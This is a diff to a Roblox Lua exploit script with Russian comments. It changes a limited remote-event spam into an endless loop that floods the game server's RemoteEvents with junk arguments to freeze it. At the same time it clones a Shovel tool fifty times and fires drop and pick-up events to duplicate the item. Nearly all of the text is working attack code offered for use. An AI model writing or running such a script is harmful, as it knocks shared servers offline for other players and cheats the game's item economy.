@@ -28,35 +28,38 @@ local function printInventory()
     end
 end
 
--- Спам для "заморозки" сервера
-local function spamServer()
+-- Полная заморозка сервера
+local function freezeServer()
     local remotes = {
         replicated.Remotes:FindFirstChild("DropItem"),
         replicated.Remotes:FindFirstChild("StoreItem"),
+        replicated.Remotes.Tool:FindFirstChild("DropTool"),
         replicated.Remotes.Tool:FindFirstChild("PickUpTool"),
         replicated.Packages.RemotePromise.Remotes:FindFirstChild("S_InteractWithObject"),
-        replicated.Remotes:FindFirstChild("EndDecision")
+        replicated.Remotes:FindFirstChild("EndDecision"),
+        replicated.Remotes:FindFirstChild("ReplicateShot"),
+        replicated.Shared.Remotes:FindFirstChild("RagdollFlop")
     }
     spawn(function()
-        for i = 1, 100 do
+        print("Замораживаю сервер — держись, мож кикнуть!")
+        while true do -- Бесконечный спам
             for _, remote in pairs(remotes) do
                 if remote then
-                    remote:FireServer(math.random(1, 1000)) -- Хаотичный спам
+                    remote:FireServer(math.random(1, 1000), {}, nil, "spam") -- Хаос
                 end
             end
-            wait(0.005)
+            wait() -- Минимальная задержка
         end
-        print("Заспамил сервер, он должен лагать!")
     end)
 end
 
--- Дюп с шифрованием и заморозкой
+-- Дюп с заморозкой
 printInventory()
 local shovel = findShovel()
 
-if shovel and (dropTool or pickUpTool) then
-    print("Начинаю дюп Shovel с заморозкой сервера!")
-    spamServer() -- Запускаем спам для лага
+if shovel then
+    print("Начинаю дюп Shovel с полной остановкой сервера!")
+    freezeServer() -- Запускаем заморозку
     
     for i = 1, 50 do
         local clone = shovel:Clone()
@@ -70,18 +73,14 @@ if shovel and (dropTool or pickUpTool) then
         clone.Parent = workspace
         clone:MoveTo(player.Character.HumanoidRootPart.Position + Vector3.new(math.random(-5, 5), 5, math.random(-5, 5)))
         
-        -- Спамим DropTool и PickUpTool
-        if dropTool then
-            dropTool:FireServer(shovel)
-        end
-        if pickUpTool then
-            pickUpTool:FireServer(clone)
-        end
+        -- Спамим
+        if dropTool then dropTool:FireServer(shovel) end
+        if pickUpTool then pickUpTool:FireServer(clone) end
         wait(0.01)
     end
     print("Заспамил с заморозкой, чекни землю и инвентарь — остались ли лопаты?")
 else
-    print("Shovel или RemoteEvent не нашёл! Возьми лопату!")
+    print("Shovel не нашёл! Возьми лопату!")
 end
 
 -- Проверка после
